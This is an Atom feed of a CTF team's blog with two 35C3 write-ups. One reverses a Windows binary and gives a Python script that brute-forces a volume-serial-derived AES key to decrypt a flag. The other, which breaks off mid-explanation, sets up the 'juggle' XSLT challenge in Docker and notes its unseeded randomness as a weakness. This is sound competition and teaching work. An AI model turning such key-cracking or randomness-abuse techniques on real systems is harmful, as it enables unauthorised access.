<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TEAMROCKETIST</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://teamrocketist.github.io/"/>
  <updated>2018-12-30T11:55:41.538Z</updated>
  <id>https://teamrocketist.github.io/</id>
  
  <author>
    <name>TEAMROCKETIST</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[Reverse] 35C3 - corebot</title>
    <link href="https://teamrocketist.github.io/2018/12/30/Reverse-35C3-corebot/"/>
    <id>https://teamrocketist.github.io/2018/12/30/Reverse-35C3-corebot/</id>
    <published>2018-12-30T10:36:09.000Z</published>
    <updated>2018-12-30T11:55:41.538Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>    Solves: 97<br><br>    <a href="https://35c3ctf.ccc.ac/uploads/corebot-640d3c582340e647d72e1dd9418a3fd6" target="_blank" rel="noopener">https://35c3ctf.ccc.ac/uploads/corebot-640d3c582340e647d72e1dd9418a3fd6</a><br><br>    Difficulty estimate: easy<br><br>    Guest challenge by Jesko / rattle.<br><br>    UPDATE: Challenge binary replaced. Apologies for the inconvenience.<br></blockquote><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul><li>Identify which encryption algorithm is being used.</li><li>Extract the encrypted data from PE resources.</li><li>Brute-force the last bytes of the serial volume key.</li><li>Generate the key with the serial.</li><li>Decrypt the data and obtain the flag.</li></ul><h2 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h2><p>So we got a windows binary that uses CryptoAPI from Microsoft first thing to do is to open the binary in IDA a check the start function:<br><a data-fancybox="gallery" href="https://i.imgur.com/Gr1QEb4.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Gr1QEb4.png" alt=""><br></a><br>So after creating the key for AES the program will import the key handle following by decrypting the loaded encrypted data from the PE resources as it is explained in the image bellow:<br><a data-fancybox="gallery" href="https://i.imgur.com/9lPKuxO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/9lPKuxO.png" alt=""><br></a><br>As I explained in the image above if you inspect the sub_11B1146 you will see it’s using the <strong>LoadResources</strong> function to <strong>extract data</strong> from the PE executable, this data happens to be the encrypted data. We can extract this data in two ways, either with dynamic analysis or with a tool to extract resources from windows binaries in my case i used <a href="https://www.systutorials.com/docs/linux/man/1-wrestool/" target="_blank" rel="noopener">wrestool</a>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wrestool --raw -x corebot-640d3c582340e647d72e1dd9418a3fd6 | xxd</span><br><span class="line">00000000: 1029 b845 9d2a ab93 fe89 fb82 9342 a18c  .).E.*.......B..</span><br><span class="line">00000010: 2e90 6300 0611 8064 b821 c29f 35e7 7ef2  ..c....d.!..5.~.</span><br></pre></td></tr></table></figure><p>Now that we got the encrypted data we need to find a way to decrypt the data, since the key was created with challenge creator <strong>volume serial</strong> we need to brute force it, since it’s only using the lower bytes of the serial we only need to brute force two bytes.</p><p>Time to write a script to bruteforce the serial and decrypt:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_ecb_cipher</span><span class="params">(ciphertext, key)</span>:</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0xffff</span>+<span class="number">1</span>):</span><br><span class="line">    v5 = <span class="number">0x10</span></span><br><span class="line">    v4 = i</span><br><span class="line">    key = <span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        key = chr(((v4 &amp; <span class="number">0xffff</span>) &amp; <span class="number">0xff</span>)) + chr(((v4 &amp; <span class="number">0xffff</span>) &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>) + key;</span><br><span class="line">        v4 ^= ((v4 &amp; <span class="number">0xffff</span>) &gt;&gt; <span class="number">4</span>) ^ ((v4 &amp; <span class="number">0xffff</span>) &lt;&lt; <span class="number">11</span>) ^ ((v4 &amp; <span class="number">0xffff</span>) &lt;&lt; <span class="number">7</span>)</span><br><span class="line">        v5 -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> v5 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    ciphertext = <span class="string">"\x10\x29\xb8\x45\x9d\x2a\xab\x93\xfe\x89\xfb\x82\x93\x42\xa1\x8c\x2e\x90\x63\x00\x06\x11\x80\x64\xb8\x21\xc2\x9f\x35\xe7\x7e\xf2"</span></span><br><span class="line">    message = decrypt_ecb_cipher(ciphertext, key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> message[:<span class="number">4</span>] == <span class="string">'35C3'</span>:</span><br><span class="line">        sys.stdout.write(message)</span><br><span class="line">        <span class="keyword">print</span> hex(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>Now running the script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python corebot.py</span><br><span class="line">35C3_MalwareAuthorKryptoChef</span><br><span class="line">0x25c3</span><br></pre></td></tr></table></figure><p>The lower bytes of the serial is 0x25c3 and the respective flag was <strong>35C3_MalwareAuthorKryptoChef</strong>.</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;    Solves: 97&lt;br&gt;&lt;br&gt;    &lt;a href=&quot;https://35c3ctf.ccc.ac/uploads/corebot-640d3c582340e647d72e1dd9418a3fd6&quot; target=&quot;_blank&quot; 
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="cryptoApi" scheme="https://teamrocketist.github.io/tags/cryptoApi/"/>
    
      <category term="35C3" scheme="https://teamrocketist.github.io/tags/35C3/"/>
    
      <category term="windowsBinary" scheme="https://teamrocketist.github.io/tags/windowsBinary/"/>
    
      <category term="exeResources" scheme="https://teamrocketist.github.io/tags/exeResources/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 35C3 - juggle</title>
    <link href="https://teamrocketist.github.io/2018/12/30/Reverse-35C3-juggle/"/>
    <id>https://teamrocketist.github.io/2018/12/30/Reverse-35C3-juggle/</id>
    <published>2018-12-30T01:03:08.000Z</published>
    <updated>2018-12-30T01:39:54.251Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>    juggle 97<br><br>    Solves: 54<br><br>    Can you help this restaurant Stack the right amount of Eggs in their ML algorithms?<br><br>    Guest challenge by Tethys.<br><br>    Note that you need to send a shutdown(2) after you sent your solution. The nmap netcat will do so for you, e.g.: ncat 35.246.237.11 1 &lt; solution.xml<br><br>        /usr/bin/ncat –help | grep -n 1 Ncat 7.60 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br><br>    Files here: <a href="https://35c3ctf.ccc.ac/uploads/juggle-f6b6fa299ba94bbbbce2058a5ca698db.tar" target="_blank" rel="noopener">https://35c3ctf.ccc.ac/uploads/juggle-f6b6fa299ba94bbbbce2058a5ca698db.tar</a><br></blockquote><p><strong>XSL</strong> service is running in the server at a certain port, a <strong>dockerfile</strong> was provided which was cool, it helped me a lot in the debugging process, in the container environment I had no previous knowledge of <strong>xslt</strong> which took me more time in this challenge than it should.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul><li>The seed is not set in <strong>random</strong> so we can abuse it by doing very quick requests to get the same numbers</li><li>Identify which plate prints the flag</li><li>Use the plates in a certain order to achieve the condition necessary to print the flag</li></ul><h2 id="Walk-through"><a href="#Walk-through" class="headerlink" title="Walk-through"></a>Walk-through</h2><p>So I started by analysing the docker file, the container is using nsjail to isolate the <strong>/usr/bin/xalan</strong> service as we can see bellow:</p><h3 id="Setting-up-the-Docker-container"><a href="#Setting-up-the-Docker-container" class="headerlink" title="Setting up the Docker container"></a>Setting up the Docker container</h3><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> tsuro/nsjail</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get install -y xalan</span></span><br><span class="line"><span class="bash">COPY challenge.min.xslt /home/user/</span></span><br><span class="line"><span class="bash"><span class="comment">#COPY tmpflag /flag</span></span></span><br><span class="line"><span class="bash">CMD /bin/sh -c <span class="string">"/usr/bin/setup_cgroups.sh &amp;&amp; su user -c '/usr/bin/nsjail -Ml --port 1337 --chroot / --user 1000 --group 1000 --cgroup_mem_max 209715200 --cgroup_pids_max 100 --cgroup_cpu_ms_per_sec 100 --rlimit_as max --rlimit_cpu max --rlimit_nofile max --rlimit_nproc max -- /usr/bin/stdbuf -i0 -o0 -e0 /usr/bin/maybe_pow.sh /usr/bin/xalan -xsl /home/user/challenge.min.xslt'"</span></span></span><br></pre></td></tr></table></figure><p>Eventually I had to fix a line in the docker file at:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COPY challenge/challenge.min.xslt /home/user/</span><br></pre></td></tr></table></figure></p><p>The <strong>challenge.min.xslt</strong> was located in the root directory after extracting the files, so I ended up changing this into:</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="bash"> challenge.min.xslt /home/user/</span></span><br></pre></td></tr></table></figure><p>So lets start to build the image with <strong>docker build</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker build -t juggle .</span><br></pre></td></tr></table></figure></p><p>After this you can list the image created:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker image ls</span><br><span class="line">REPOSITORY                 TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">permute                    latest              1603e833509a        23 hours ago        147MB</span><br><span class="line">juggle                     latest              b4c26a022c1e        33 hours ago        205MB</span><br><span class="line">tsuro/nsjail               latest              8774d7aad732        2 days ago          156MB</span><br><span class="line">adalovelace/nodejs         latest              c2a6e42b25c8        2 days ago          63.7MB</span><br><span class="line">node                       6-alpine            c45d42c157e3        2 days ago          55.6MB</span><br><span class="line">nginx                      latest              02256cfb0e4b        2 days ago          109MB</span><br><span class="line">alpine                     latest              3f53bb00af94        8 days ago          4.41MB</span><br><span class="line">centos                     7                   1e1148e4cc2c        3 weeks ago         202MB</span><br><span class="line">postgres                   latest              f9b577fb1ed6        4 weeks ago         311MB</span><br><span class="line">thecolonial/police-quest   1.0                 0ea244849eb0        4 weeks ago         345MB</span><br><span class="line">ubuntu                     14.04               f17b6a61de28        5 weeks ago         188MB</span><br><span class="line">mysql                      latest              f991c20cb508        6 weeks ago         486MB</span><br><span class="line">httpd                      latest              2a51bb06dc8b        6 weeks ago         132MB</span><br><span class="line">debian                     latest              4879790bd60d        6 weeks ago         101MB</span><br><span class="line">seccon_pwn                 latest              3749dfe7031c        7 weeks ago         2.06GB</span><br><span class="line">skysider/pwndocker         latest              a24dde07a423        7 weeks ago         2.02GB</span><br><span class="line">elasticsearch              2                   5e9d896dc62c        3 months ago        479MB</span><br><span class="line">postgres                   9.6.2               b3b8a2229953        19 months ago       267MB</span><br><span class="line">postgres                   9.6.1               4023a747a01a        23 months ago       265MB</span><br></pre></td></tr></table></figure><p>As we can see in the list the <strong>juggle</strong> image was created (the name we gave it). </p><p>With this we can start running the container by just using <strong>docker container run</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker run -it -p 1337:1337 --name 35c3_juggle juggle bash</span><br></pre></td></tr></table></figure></p><p>After this a bash console will pop-up in the container unfortunately the command in the end of the docker didn’t work maybe something related with <strong>nsjail</strong>, I don’t know maybe I did something wrong when I was trying to connect to the service, I even tryed to rerun the command inside the container but it always gave me an error, so to not loose much time identifying it I setted up very quiclky a service with <strong>socat</strong>, <strong>socat</strong> isn’t installed in this container so I needed to install it via <strong>apt-get</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@b0927d9b031a $ socat tcp-listen:1337,fork,reuseaddr EXEC:/usr/bin/xalan -xsl /home/user/challenge.min.xslt<span class="string">'</span></span><br></pre></td></tr></table></figure><p>Since I forwarded the port 1337 from the host to the container port 1337 with the parameter <strong>-p</strong> in the <strong>docker run</strong> command. Now I could connect from the host directly to the localhost with <strong>ncat localhost 1337</strong> without getting any errors from the server.</p><h3 id="XML-format-analysis"><a href="#XML-format-analysis" class="headerlink" title="XML format analysis"></a>XML format analysis</h3><p>So it’s time to start analysing the <strong>challenge.min.xslt</strong> file, this file was minimized so I searched for an online tool to beautify to make it more readable, so lets start with the beginning:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;xsl:stylesheet version=&quot;1.0&quot;</span><br><span class="line">    xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;</span><br><span class="line">    xmlns:math=&quot;http://exslt.org/math&quot;</span><br><span class="line">    xmlns:exsl=&quot;http://exslt.org/common&quot; exclude-result-prefixes=&quot;xsl math exsl&quot;&gt;</span><br><span class="line">    &lt;xsl:template match=&quot;/meal&quot;&gt;</span><br><span class="line">        &lt;all&gt;</span><br><span class="line">            &lt;xsl:if test=&quot;count(//plate) &gt; 300&quot;&gt;</span><br><span class="line">                &lt;xsl:message terminate=&quot;yes&quot;&gt;You do not have enough money to buy that much food&lt;/xsl:message&gt;</span><br><span class="line">            &lt;/xsl:if&gt;</span><br><span class="line">            &lt;xsl:variable name=&quot;chef-drinks&quot;&gt;</span><br><span class="line">                &lt;value&gt;</span><br><span class="line">                    &lt;xsl:value-of select=&quot;round(math:random() * 4294967296)&quot;/&gt;</span><br><span class="line">                &lt;/value&gt;</span><br><span class="line">                &lt;value&gt;</span><br><span class="line">                    &lt;xsl:value-of select=&quot;round(math:random() * 4294967296)&quot;/&gt;</span><br><span class="line">                &lt;/value&gt;</span><br><span class="line">                &lt;value&gt;</span><br><span class="line">                    &lt;xsl:value-of select=&quot;round(math:random() * 4294967296)&quot;/&gt;</span><br><span class="line">                &lt;/value&gt;</span><br><span class="line">                &lt;value&gt;</span><br><span class="line">                    &lt;xsl:value-of select=&quot;round(math:random() * 4294967296)&quot;/&gt;</span><br><span class="line">                &lt;/value&gt;</span><br><span class="line">                &lt;value&gt;</span><br><span class="line">                    &lt;xsl:value-of select=&quot;round(math:random() * 4294967296)&quot;/&gt;</span><br><span class="line">                &lt;/value&gt;</span><br><span class="line">            &lt;/xsl:variable&gt;</span><br><span class="line">            &lt;xsl:call-template name=&quot;consume-meal&quot;&gt;</span><br><span class="line">                &lt;xsl:with-param name=&quot;chef-drinks&quot; select=&quot;exsl:node-set($chef-drinks)//value&quot;/&gt;</span><br><span class="line">                &lt;xsl:with-param name=&quot;food-eaten&quot; select=&quot;1&quot;/&gt;</span><br><span class="line">                &lt;xsl:with-param name=&quot;course&quot; select=&quot;course[position() = 1]/plate&quot;/&gt;</span><br><span class="line">                &lt;xsl:with-param name=&quot;drinks&quot; select=&quot;state/drinks&quot;/&gt;</span><br><span class="line">            &lt;/xsl:call-template&gt;</span><br><span class="line">        &lt;/all&gt;</span><br><span class="line">    &lt;/xsl:template&gt;</span><br><span class="line">    &lt;xsl:template name=&quot;consume-meal&quot;&gt;</span><br><span class="line">        &lt;xsl:param name=&quot;chef-drinks&quot;/&gt;</span><br><span class="line">        &lt;xsl:param name=&quot;food-eaten&quot;/&gt;</span><br><span class="line">        &lt;xsl:param name=&quot;course&quot;/&gt;</span><br><span class="line">        &lt;xsl:param name=&quot;drinks&quot;/&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>So if you don’t know about <strong>xslt</strong> is a language that parses a xml document, and with that you can do things like converting that xml into html in a very easy way. Right at the beginning we can see what kind of structure of xml they want : </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:template match=&quot;/meal&quot;&gt;</span><br></pre></td></tr></table></figure><p>The match parameter will look in the xml document from the root for a tag <strong><meal> </meal></strong>, from this you can look up into the elements inside of it. Now right after setting this an variable is declared with some <strong>random numbers</strong> (drinks), variables like in any <strong>other language</strong> are used to <strong>store</strong> values to be used later, in xslt is no different.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:variable name=&quot;chef-drinks&quot;&gt;</span><br><span class="line">&lt;value&gt;</span><br><span class="line">&lt;xsl:variable name=&quot;chef-drinks&quot;&gt;</span><br><span class="line">    &lt;value&gt;</span><br><span class="line">        &lt;xsl:value-of select=&quot;round(math:random() * 4294967296)&quot;/&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">    &lt;value&gt;</span><br><span class="line">        &lt;xsl:value-of select=&quot;round(math:random() * 4294967296)&quot;/&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">    &lt;value&gt;</span><br><span class="line">        &lt;xsl:value-of select=&quot;round(math:random() * 4294967296)&quot;/&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">    &lt;value&gt;</span><br><span class="line">        &lt;xsl:value-of select=&quot;round(math:random() * 4294967296)&quot;/&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">    &lt;value&gt;</span><br><span class="line">        &lt;xsl:value-of select=&quot;round(math:random() * 4294967296)&quot;/&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">&lt;/xsl:variable&gt;</span><br></pre></td></tr></table></figure><p>This random implementation looks already suspicious, looks it it doesn’t even have any kind of seed, and if it has a seed it probably is the current time. Now right after declaring this drinks with random numbers it does a <strong>template</strong> call as you can see bellow:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:call-template name=&quot;consume-meal&quot;&gt;</span><br><span class="line">    &lt;xsl:with-param name=&quot;chef-drinks&quot; select=&quot;exsl:node-set($chef-drinks)//value&quot;/&gt;</span><br><span class="line">    &lt;xsl:with-param name=&quot;food-eaten&quot; select=&quot;1&quot;/&gt;</span><br><span class="line">    &lt;xsl:with-param name=&quot;course&quot; select=&quot;course[position() = 1]/plate&quot;/&gt;</span><br><span class="line">    &lt;xsl:with-param name=&quot;drinks&quot; select=&quot;state/drinks&quot;/&gt;</span><br><span class="line">&lt;/xsl:call-template&gt;</span><br></pre></td></tr></table></figure><p>You can think of this like it’s a function call in a <strong>normal language</strong>, the name of the function is <strong>consume-meal</strong> and its arguments are right below, the declaration of <strong>consume-meal</strong> is just below this code, but before doing that lets analyse the <strong>selects</strong> for the arguments since they give us hints about how the <strong>xml</strong> document should be built. </p><p>So for the first parameter:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:with-param name=&quot;chef-drinks&quot; select=&quot;exsl:node-set($chef-drinks)//value&quot;/&gt;</span><br></pre></td></tr></table></figure><p>so <strong>exsl:node-set</strong> will just grab all the values from the variable <strong>$chef-drinks</strong> and pass it into the function as it was an array, explaining the <strong>//value</strong> part, the first <strong>/</strong> is referencing the the tag of the variable <strong>&lt;xsl:variable name=”chef-drinks”&gt;</strong> and the <strong>/value</strong> is referencing to the <strong>\&lt;value></strong> tag, this extracts the variable random number drinks and sets them as an array to be used in the template “function”. </p><p>So for the second parameter:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:with-param name=&quot;food-eaten&quot; select=&quot;1&quot;/&gt;</span><br></pre></td></tr></table></figure><p>The <strong>food-eaten</strong> parameter is initialized into 1 and this an integer variable that ill keep track of the number of plates you consume, after analysing <strong>consume-meal</strong> you will see that there’s a limit of plates you can eat that’s why they are tracking this number here.</p><p>So for the third parameter:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:with-param name=&quot;course&quot; select=&quot;course[position() = 1]/plate&quot;/&gt;</span><br></pre></td></tr></table></figure><p>Since we are inside a template tag <strong>match</strong> meal, by analysing this select it looks it inside the tag meal, our xml will need to have a <strong>course</strong> tag (\&lt;course>) and plate tags inside of it, this works like a hierarchy from the left to right, the part <strong>[position() = 1]</strong> is just selecting the first plate inside the <strong>course</strong> tag, an example xml could be like this:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line">                    1st plate</span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line">                    2nd plate</span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure><p>So <strong>course[position() = 1]</strong> will select the first plate inside <strong>course</strong> so the parameter <strong>course</strong> will be set into : </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line">  1st plate</span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br></pre></td></tr></table></figure><p>So for the fourth parameter:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"state/drinks"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>Once again this will select all the drinks declared inside <strong>state</strong> and <strong>drinks</strong> tags, so two new tags will needed to be added inside <strong>meal</strong> tag. </p><p>Based on the information we have now an example xml can be build like this:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line">                    1st plate</span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line">                    2nd plate</span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>1<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>2<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>And now finally analysing the “function” <strong>consume-meal</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;xsl:template name=&quot;consume-meal&quot;&gt;</span><br><span class="line">     &lt;xsl:param name=&quot;chef-drinks&quot;/&gt;</span><br><span class="line">     &lt;xsl:param name=&quot;food-eaten&quot;/&gt;</span><br><span class="line">     &lt;xsl:param name=&quot;course&quot;/&gt;</span><br><span class="line">     &lt;xsl:param name=&quot;drinks&quot;/&gt;</span><br><span class="line">     &lt;xsl:if test=&quot;$food-eaten &gt; 30000&quot;&gt;</span><br><span class="line">&lt;xsl:message terminate=&quot;yes&quot;&gt;You ate too much and died&lt;/xsl:message&gt;</span><br><span class="line">     &lt;/xsl:if&gt;</span><br><span class="line">     &lt;xsl:if test=&quot;count($drinks) &gt; 200&quot;&gt;</span><br><span class="line">&lt;xsl:message terminate=&quot;yes&quot;&gt;You cannot drink that much&lt;/xsl:message&gt;</span><br><span class="line">     &lt;/xsl:if&gt;</span><br></pre></td></tr></table></figure><p>Right at the beginning the parameters of the “function” are being declared, and two <strong>ifs</strong> are checking if we ate more than 30k plates or more than 200 drinks, so if we eat of drink more than that , the function terminates and “prints” a message to the user.</p><p>After this we come up with a new <strong>if</strong>, it checks if the number of plates is higher than 0, and a new tag <strong><a href="xsl:choose" target="_blank" rel="noopener">xsl:choose</a></strong>, which is like a <strong>switch-case</strong> from the c language the <strong>when</strong> tags are the case clauses, and it only enters it if the condition is true of course. Right before the <strong>choose</strong> two variables are being initialized, <strong>c</strong> and <strong>r</strong> , 